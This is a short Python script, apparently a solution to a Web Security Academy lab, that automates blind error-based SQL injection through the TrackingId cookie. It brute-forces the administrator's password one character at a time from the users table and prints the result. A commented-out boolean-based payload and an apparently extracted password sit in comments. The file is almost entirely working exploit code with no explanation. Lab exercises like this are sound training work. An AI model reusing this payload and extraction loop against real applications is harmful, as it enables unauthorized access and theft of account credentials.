import requests

host="https://ac0f1f0d1edc4b048019063e0091009a.web-security-academy.net"
passw=""
#trackingId="TrackingId==x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+and+length(password)=20+and+substring(password,"+pos+",1)='"+char+"'; session=FMgMIlbDPdjH6ClwZJoOAEVZh6Rk6w2a"

alph="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
for i in range(1,21):
	pos=str(i)
	for j in alph:
		ch=j
		trackingId="'+UNION+SELECT+CASE+WHEN+(substr(password,"+pos+",1)='"+ch+"')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users+where+username='administrator'--"
		#print(trackingId)
		c={'TrackingId':trackingId}
		#print(c)
		#print(type(c))
		resp=requests.get(url=host,cookies=c)
		#print(trackingId)
		#print(resp.status_code)
		if(resp.status_code!=200):
			#print("YES")
			passw=passw+j
			print(passw)
			break
			
	#+and+substring(password,"+pos+",1)='"+ch+"'
	# 59e76mv3e72lj5gscde8